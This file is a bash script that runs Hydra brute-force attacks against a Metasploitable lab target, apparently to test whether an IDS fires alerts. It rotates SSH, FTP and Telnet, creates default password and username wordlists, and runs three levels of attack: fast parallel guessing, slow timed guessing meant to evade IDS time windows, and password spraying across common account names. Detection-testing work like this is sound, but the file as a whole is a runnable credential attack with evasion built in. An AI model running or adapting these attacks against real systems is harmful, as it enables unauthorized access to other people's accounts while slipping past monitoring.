#!/bin/bash

# =================================================================
# SCENARIO 02: BRUTE FORCE (HYDRA) - PAYLOAD ROTATION
# Strategy: 3 Level Depth (Noisy, Low-Slow, Password Spraying)
# Input: Receives argument $1 as the Round Number
# =================================================================

# Receive Input Round Number from Daily Round
ROUND=${1:-1} # Default to round 1 if empty

# CONFIGURATION
TARGET_IP="192.168.x.x"   # Replace with your Metasploitable IP
TARGET_USER="msfadmin"       # Valid user
LOG_FILE="logs/hydra_session_$(date +%F).log"

# Colors for Report Display
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# =================================================================
# PAYLOAD ROTATION LOGIC (PAYLOAD DIVERSITY)
# Changes the protocol and timing based on the round phase
# =================================================================
if [ "$ROUND" -le 10 ]; then
    # --- SET A (Round 1-10) ---
    # Protocol: SSH (Default)
    SERVICE_PROTO="ssh"
    # Level 2 Timing: 5-second delay
    WAIT_TIME="5"
    DESC="SSH Brute Force (Port 22)"

elif [ "$ROUND" -le 20 ]; then
    # --- SET B (Round 11-20) ---
    # Protocol: FTP (Port 21)
    SERVICE_PROTO="ftp"
    # Level 2 Timing: 15-second delay (slower)
    WAIT_TIME="15"
    DESC="FTP Brute Force (Port 21)"

else
    # --- SET C (Round 21-30) ---
    # Protocol: Telnet (Port 23)
    SERVICE_PROTO="telnet"
    # Level 2 Timing: 30-second delay (very slow)
    WAIT_TIME="30"
    DESC="Telnet Brute Force (Port 23)"
fi

# CREATE DUMMY WORDLIST
echo "123456" > logs/pass_short.txt
echo "password" >> logs/pass_short.txt
echo "admin123" >> logs/pass_short.txt
echo "qwerty" >> logs/pass_short.txt
echo "root" >> logs/pass_short.txt
echo "toor" >> logs/pass_short.txt
echo "12345678" >> logs/pass_short.txt
echo "admin" >> logs/pass_short.txt
echo "kali" >> logs/pass_short.txt
echo "sysadmin" >> logs/pass_short.txt
echo "master" >> logs/pass_short.txt
echo "111111" >> logs/pass_short.txt
echo "letmein" >> logs/pass_short.txt
echo "hunter2" >> logs/pass_short.txt
echo "msfadmin" >> logs/pass_short.txt

echo "root" > logs/user_list.txt
echo "admin" >> logs/user_list.txt
echo "support" >> logs/user_list.txt
echo "user" >> logs/user_list.txt
echo "guest" >> logs/user_list.txt
echo "test" >> logs/user_list.txt
echo "oracle" >> logs/user_list.txt
echo "postgres" >> logs/user_list.txt
echo "mysql" >> logs/user_list.txt
echo "tomcat" >> logs/user_list.txt
echo "ubuntu" >> logs/user_list.txt
echo "kali" >> logs/user_list.txt
echo "debian" >> logs/user_list.txt
echo "centos" >> logs/user_list.txt
echo "msfadmin" >> logs/user_list.txt

echo "[+] [02_HYDRA] Starting Brute Force Scenario..."
echo "[+] Target: $TARGET_IP"
echo "[+] Mode: Round $ROUND ($DESC)"
echo "[+] Start Time: $(date)"

# -----------------------------------------------------------------
# LEVEL 1: NOISY ATTACK (Traditional Brute Force)
# Goal: Baseline. Test failed login detection threshold.
# Technique: Parallel tasks (-t 4), fast.
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 1] Running Fast Brute Force (-t 4) on $SERVICE_PROTO...${NC}"

# Store command (using $SERVICE_PROTO variable)
CMD="hydra -l $TARGET_USER -P logs/pass_short.txt $SERVICE_PROTO://$TARGET_IP -t 4 -V"

# Display the command on screen
echo -e "${YELLOW}    [COMMAND] $CMD${NC}"

# Execute the command (unique log file per round)
$CMD -o logs/hydra_lvl1_r${ROUND}.txt > /dev/null 2>&1
echo "    -> Completed. (Expected: ET SCAN / Brute Force alerts)"
sleep 10

# -----------------------------------------------------------------
# LEVEL 2: LOW & SLOW (Timing Evasion)
# Goal: Test the IDS time window threshold.
# Technique: Single task (-t 1) with variable delay $WAIT_TIME.
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 2] Running Low-Slow Attack (-w $WAIT_TIME) on $SERVICE_PROTO...${NC}"

# Store command (using $WAIT_TIME variable)
CMD="hydra -l $TARGET_USER -P logs/pass_short.txt $SERVICE_PROTO://$TARGET_IP -t 1 -w $WAIT_TIME"

# Display the command on screen
echo -e "${YELLOW}    [COMMAND] $CMD${NC}"

# Execute the command
$CMD -o logs/hydra_lvl2_r${ROUND}.txt > /dev/null 2>&1
echo "    -> Completed. (Expected: Possible false negative / no alert)"
sleep 5

# -----------------------------------------------------------------
# LEVEL 3: PASSWORD SPRAYING (Reverse Brute Force)
# Goal: Avoid the standard rule of "1 IP to 1 User".
# Technique: Try 1 password against many users.
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 3] Running Password Spraying on $SERVICE_PROTO...${NC}"

# Store the command
CMD="hydra -L logs/user_list.txt -p password123 $SERVICE_PROTO://$TARGET_IP -t 4"

# Display the command on screen
echo -e "${YELLOW}    [COMMAND] $CMD${NC}"

# Execute the command
$CMD -o logs/hydra_lvl3_r${ROUND}.txt > /dev/null 2>&1
echo "    -> Completed. (Expected: Different/specific spraying alert)"

# CLEANUP
rm logs/pass_short.txt logs/user_list.txt

echo "[+] [02_HYDRA] Scenario Completed at $(date)"
echo "-----------------------------------------------------------"
